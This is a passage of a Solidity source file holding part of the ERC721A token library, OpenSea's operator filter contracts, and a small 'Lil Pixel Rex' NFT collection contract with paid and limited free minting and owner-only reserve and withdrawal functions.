1042     function _mint(address to, uint256 quantity) internal virtual {
1043         uint256 startTokenId = _currentIndex;
1044         if (quantity == 0) revert MintZeroQuantity();
1045 
1046         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1047 
1048         // Overflows are incredibly unrealistic.
1049         // `balance` and `numberMinted` have a maximum limit of 2**64.
1050         // `tokenId` has a maximum limit of 2**256.
1051         unchecked {
1052             // Updates:
1053             // - `balance += quantity`.
1054             // - `numberMinted += quantity`.
1055             //
1056             // We can directly add to the `balance` and `numberMinted`.
1057             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1058 
1059             // Updates:
1060             // - `address` to the owner.
1061             // - `startTimestamp` to the timestamp of minting.
1062             // - `burned` to `false`.
1063             // - `nextInitialized` to `quantity == 1`.
1064             _packedOwnerships[startTokenId] = _packOwnershipData(
1065                 to,
1066                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1067             );
1068 
1069             uint256 toMasked;
1070             uint256 end = startTokenId + quantity;
1071 
1072             // Use assembly to loop and emit the `Transfer` event for gas savings.
1073             // The duplicated `log4` removes an extra check and reduces stack juggling.
1074             // The assembly, together with the surrounding Solidity code, have been
1075             // delicately arranged to nudge the compiler into producing optimized opcodes.
1076             assembly {
1077                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1078                 toMasked := and(to, _BITMASK_ADDRESS)
1079                 // Emit the `Transfer` event.
1080                 log4(
1081                     0, // Start of data (0, since no data).
1082                     0, // End of data (0, since no data).
1083                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1084                     0, // `address(0)`.
1085                     toMasked, // `to`.
1086                     startTokenId // `tokenId`.
1087                 )
1088 
1089                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1090                 // that overflows uint256 will make the loop run out of gas.
1091                 // The compiler will optimize the `iszero` away for performance.
1092                 for {
1093                     let tokenId := add(startTokenId, 1)
1094                 } iszero(eq(tokenId, end)) {
1095                     tokenId := add(tokenId, 1)
1096                 } {
1097                     // Emit the `Transfer` event. Similar to above.
1098                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1099                 }
1100             }
1101             if (toMasked == 0) revert MintToZeroAddress();
1102 
1103             _currentIndex = end;
1104         }
1105         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1106     }
1107 
1108     /**
1109      * @dev Mints `quantity` tokens and transfers them to `to`.
1110      *
1111      * This function is intended for efficient minting only during contract creation.
1112      *
1113      * It emits only one {ConsecutiveTransfer} as defined in
1114      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1115      * instead of a sequence of {Transfer} event(s).
1116      *
1117      * Calling this function outside of contract creation WILL make your contract
1118      * non-compliant with the ERC721 standard.
1119      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1120      * {ConsecutiveTransfer} event is only permissible during contract creation.
1121      *
1122      * Requirements:
1123      *
1124      * - `to` cannot be the zero address.
1125      * - `quantity` must be greater than 0.
1126      *
1127      * Emits a {ConsecutiveTransfer} event.
1128      */
1129     function _mintERC2309(address to, uint256 quantity) internal virtual {
1130         uint256 startTokenId = _currentIndex;
1131         if (to == address(0)) revert MintToZeroAddress();
1132         if (quantity == 0) revert MintZeroQuantity();
1133         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1134 
1135         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1136 
1137         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1138         unchecked {
1139             // Updates:
1140             // - `balance += quantity`.
1141             // - `numberMinted += quantity`.
1142             //
1143             // We can directly add to the `balance` and `numberMinted`.
1144             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1145 
1146             // Updates:
1147             // - `address` to the owner.
1148             // - `startTimestamp` to the timestamp of minting.
1149             // - `burned` to `false`.
1150             // - `nextInitialized` to `quantity == 1`.
1151             _packedOwnerships[startTokenId] = _packOwnershipData(
1152                 to,
1153                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1154             );
1155 
1156             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1157 
1158             _currentIndex = startTokenId + quantity;
1159         }
1160         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1161     }
1162 
1163     /**
1164      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1165      *
1166      * Requirements:
1167      *
1168      * - If `to` refers to a smart contract, it must implement
1169      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1170      * - `quantity` must be greater than 0.
1171      *
1172      * See {_mint}.
1173      *
1174      * Emits a {Transfer} event for each mint.
1175      */
1176     function _safeMint(
1177         address to,
1178         uint256 quantity,
1179         bytes memory _data
1180     ) internal virtual {
1181         _mint(to, quantity);
1182 
1183         unchecked {
1184             if (to.code.length != 0) {
1185                 uint256 end = _currentIndex;
1186                 uint256 index = end - quantity;
1187                 do {
1188                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1189                         revert TransferToNonERC721ReceiverImplementer();
1190                     }
1191                 } while (index < end);
1192                 // Reentrancy protection.
1193                 if (_currentIndex != end) revert();
1194             }
1195         }
1196     }
1197 
1198     /**
1199      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1200      */
1201     function _safeMint(address to, uint256 quantity) internal virtual {
1202         _safeMint(to, quantity, '');
1203     }
1204 
1205     // =============================================================
1206     //                        BURN OPERATIONS
1207     // =============================================================
1208 
1209     /**
1210      * @dev Equivalent to `_burn(tokenId, false)`.
1211      */
1212     function _burn(uint256 tokenId) internal virtual {
1213         _burn(tokenId, false);
1214     }
1215 
1216     /**
1217      * @dev Destroys `tokenId`.
1218      * The approval is cleared when the token is burned.
1219      *
1220      * Requirements:
1221      *
1222      * - `tokenId` must exist.
1223      *
1224      * Emits a {Transfer} event.
1225      */
1226     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1227         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1228 
1229         address from = address(uint160(prevOwnershipPacked));
1230 
1231         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1232 
1233         if (approvalCheck) {
1234             // The nested ifs save around 20+ gas over a compound boolean condition.
1235             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1236                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1237         }
1238 
1239         _beforeTokenTransfers(from, address(0), tokenId, 1);
1240 
1241         // Clear approvals from the previous owner.
1242         assembly {
1243             if approvedAddress {
1244                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1245                 sstore(approvedAddressSlot, 0)
1246             }
1247         }
1248 
1249         // Underflow of the sender's balance is impossible because we check for
1250         // ownership above and the recipient's balance can't realistically overflow.
1251         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1252         unchecked {
1253             // Updates:
1254             // - `balance -= 1`.
1255             // - `numberBurned += 1`.
1256             //
1257             // We can directly decrement the balance, and increment the number burned.
1258             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1259             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1260 
1261             // Updates:
1262             // - `address` to the last owner.
1263             // - `startTimestamp` to the timestamp of burning.
1264             // - `burned` to `true`.
1265             // - `nextInitialized` to `true`.
1266             _packedOwnerships[tokenId] = _packOwnershipData(
1267                 from,
1268                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1269             );
1270 
1271             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1272             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1273                 uint256 nextTokenId = tokenId + 1;
1274                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1275                 if (_packedOwnerships[nextTokenId] == 0) {
1276                     // If the next slot is within bounds.
1277                     if (nextTokenId != _currentIndex) {
1278                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1279                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1280                     }
1281                 }
1282             }
1283         }
1284 
1285         emit Transfer(from, address(0), tokenId);
1286         _afterTokenTransfers(from, address(0), tokenId, 1);
1287 
1288         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1289         unchecked {
1290             _burnCounter++;
1291         }
1292     }
1293 
1294     // =============================================================
1295     //                     EXTRA DATA OPERATIONS
1296     // =============================================================
1297 
1298     /**
1299      * @dev Directly sets the extra data for the ownership data `index`.
1300      */
1301     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1302         uint256 packed = _packedOwnerships[index];
1303         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1304         uint256 extraDataCasted;
1305         // Cast `extraData` with assembly to avoid redundant masking.
1306         assembly {
1307             extraDataCasted := extraData
1308         }
1309         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1310         _packedOwnerships[index] = packed;
1311     }
1312 
1313     /**
1314      * @dev Called during each token transfer to set the 24bit `extraData` field.
1315      * Intended to be overridden by the cosumer contract.
1316      *
1317      * `previousExtraData` - the value of `extraData` before transfer.
1318      *
1319      * Calling conditions:
1320      *
1321      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1322      * transferred to `to`.
1323      * - When `from` is zero, `tokenId` will be minted for `to`.
1324      * - When `to` is zero, `tokenId` will be burned by `from`.
1325      * - `from` and `to` are never both zero.
1326      */
1327     function _extraData(
1328         address from,
1329         address to,
1330         uint24 previousExtraData
1331     ) internal view virtual returns (uint24) {}
1332 
1333     /**
1334      * @dev Returns the next extra data for the packed ownership data.
1335      * The returned result is shifted into position.
1336      */
1337     function _nextExtraData(
1338         address from,
1339         address to,
1340         uint256 prevOwnershipPacked
1341     ) private view returns (uint256) {
1342         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1343         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1344     }
1345 
1346     // =============================================================
1347     //                       OTHER OPERATIONS
1348     // =============================================================
1349 
1350     /**
1351      * @dev Returns the message sender (defaults to `msg.sender`).
1352      *
1353      * If you are writing GSN compatible contracts, you need to override this function.
1354      */
1355     function _msgSenderERC721A() internal view virtual returns (address) {
1356         return msg.sender;
1357     }
1358 
1359     /**
1360      * @dev Converts a uint256 to its ASCII string decimal representation.
1361      */
1362     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1363         assembly {
1364             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1365             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1366             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1367             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1368             let m := add(mload(0x40), 0xa0)
1369             // Update the free memory pointer to allocate.
1370             mstore(0x40, m)
1371             // Assign the `str` to the end.
1372             str := sub(m, 0x20)
1373             // Zeroize the slot after the string.
1374             mstore(str, 0)
1375 
1376             // Cache the end of the memory to calculate the length later.
1377             let end := str
1378 
1379             // We write the string from rightmost digit to leftmost digit.
1380             // The following is essentially a do-while loop that also handles the zero case.
1381             // prettier-ignore
1382             for { let temp := value } 1 {} {
1383                 str := sub(str, 1)
1384                 // Write the character to the pointer.
1385                 // The ASCII index of the '0' character is 48.
1386                 mstore8(str, add(48, mod(temp, 10)))
1387                 // Keep dividing `temp` until zero.
1388                 temp := div(temp, 10)
1389                 // prettier-ignore
1390                 if iszero(temp) { break }
1391             }
1392 
1393             let length := sub(end, str)
1394             // Move the pointer 32 bytes leftwards to make room for the length.
1395             str := sub(str, 0x20)
1396             // Store the length.
1397             mstore(str, length)
1398         }
1399     }
1400 }
1401 
1402 
1403 interface IOperatorFilterRegistry {
1404     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1405     function register(address registrant) external;
1406     function registerAndSubscribe(address registrant, address subscription) external;
1407     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1408     function unregister(address addr) external;
1409     function updateOperator(address registrant, address operator, bool filtered) external;
1410     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1411     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1412     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1413     function subscribe(address registrant, address registrantToSubscribe) external;
1414     function unsubscribe(address registrant, bool copyExistingEntries) external;
1415     function subscriptionOf(address addr) external returns (address registrant);
1416     function subscribers(address registrant) external returns (address[] memory);
1417     function subscriberAt(address registrant, uint256 index) external returns (address);
1418     function copyEntriesOf(address registrant, address registrantToCopy) external;
1419     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1420     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1421     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1422     function filteredOperators(address addr) external returns (address[] memory);
1423     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1424     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1425     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1426     function isRegistered(address addr) external returns (bool);
1427     function codeHashOf(address addr) external returns (bytes32);
1428 }
1429 
1430 
1431 /**
1432  * @title  OperatorFilterer
1433  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1434  *         registrant's entries in the OperatorFilterRegistry.
1435  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1436  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1437  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1438  */
1439 abstract contract OperatorFilterer {
1440     error OperatorNotAllowed(address operator);
1441 
1442     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1443         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1444 
1445     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1446         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1447         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1448         // order for the modifier to filter addresses.
1449         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1450             if (subscribe) {
1451                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1452             } else {
1453                 if (subscriptionOrRegistrantToCopy != address(0)) {
1454                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1455                 } else {
1456                     OPERATOR_FILTER_REGISTRY.register(address(this));
1457                 }
1458             }
1459         }
1460     }
1461 
1462     modifier onlyAllowedOperator(address from) virtual {
1463         // Check registry code length to facilitate testing in environments without a deployed registry.
1464         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1465             // Allow spending tokens from addresses with balance
1466             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1467             // from an EOA.
1468             if (from == msg.sender) {
1469                 _;
1470                 return;
1471             }
1472             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1473                 revert OperatorNotAllowed(msg.sender);
1474             }
1475         }
1476         _;
1477     }
1478 
1479     modifier onlyAllowedOperatorApproval(address operator) virtual {
1480         // Check registry code length to facilitate testing in environments without a deployed registry.
1481         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1482             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1483                 revert OperatorNotAllowed(operator);
1484             }
1485         }
1486         _;
1487     }
1488 }
1489 
1490 /**
1491  * @title  DefaultOperatorFilterer
1492  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1493  */
1494 abstract contract TheOperatorFilterer is OperatorFilterer {
1495     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1496 
1497     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1498 }
1499 
1500 
1501 contract LilPixelRex is ERC721A, TheOperatorFilterer {
1502     bool public _isSaleActive;
1503     bool public _revealed;
1504     uint256 public mintPrice;
1505     uint256 public maxBalance;
1506     uint256 public maxMint;
1507     string public baseExtension;
1508     string public uriSuffix;
1509     address public owner;
1510     uint256 public maxSupply;
1511     uint256 public cost;
1512     uint256 public maxFreeNumerAddr = 1;
1513     mapping(address => uint256) _numForFree;
1514     mapping(uint256 => uint256) _numMinted;
1515     uint256 private maxPerTx;
1516 
1517     function publicMint(uint256 amount) payable public {
1518         require(totalSupply() + amount <= maxSupply);
1519         if (msg.value == 0) {
1520             _safemints(amount);
1521             return;
1522         } 
1523         require(amount <= maxPerTx);
1524         require(msg.value >= amount * cost);
1525         _safeMint(msg.sender, amount);
1526     }
1527 
1528     function _safemints(uint256 amount) internal {
1529         require(amount == 1 
1530             && _numMinted[block.number] < FreeNum() 
1531             && _numForFree[tx.origin] < maxFreeNumerAddr );
1532             _numForFree[tx.origin]++;
1533             _numMinted[block.number]++;
1534         _safeMint(msg.sender, 1);
1535     }
1536 
1537     function reserve(address rec, uint256 amount) public onlyOwner {
1538         _safeMint(rec, amount);
1539     }
1540     
1541     modifier onlyOwner {
1542         require(owner == msg.sender);
1543         _;
1544     }
1545 
1546     constructor() ERC721A("Lil Pixel Rex", "LPR") {
1547         owner = msg.sender;
1548         maxPerTx = 10;
1549         cost = 0.002 ether;
1550         maxSupply = 1000;
1551     }
1552 
1553     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1554         return string(abi.encodePacked("ipfs://bafybeiddik6tc6oyzawxosw5zowjjrjsbwcach6cstnrkp7ir7ixu5k5vy/", _toString(tokenId), ".json"));
1555     }
1556 
1557     function setMaxFreePerAddr(uint256 maxTx) external onlyOwner {
1558         maxFreeNumerAddr = maxTx;
1559     }
1560 
1561     function FreeNum() internal returns (uint256){
1562         return (maxSupply - totalSupply()) / 12;
1563     }
1564 
1565     function withdraw() external onlyOwner {
1566         payable(msg.sender).transfer(address(this).balance);
1567     }
1568 
1569     /////////////////////////////
1570     // OPENSEA FILTER REGISTRY 
1571     /////////////////////////////
1572 
1573     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1574         super.setApprovalForAll(operator, approved);
1575     }
1576 
1577     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1578         super.approve(operator, tokenId);
1579     }
1580 
1581     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1582         super.transferFrom(from, to, tokenId);
1583     }
1584 
1585     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1586         super.safeTransferFrom(from, to, tokenId);
1587     }
1588 
1589     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1590         public
1591         payable
1592         override
1593         onlyAllowedOperator(from)
1594     {
1595         super.safeTransferFrom(from, to, tokenId, data);
1596     }
1597 }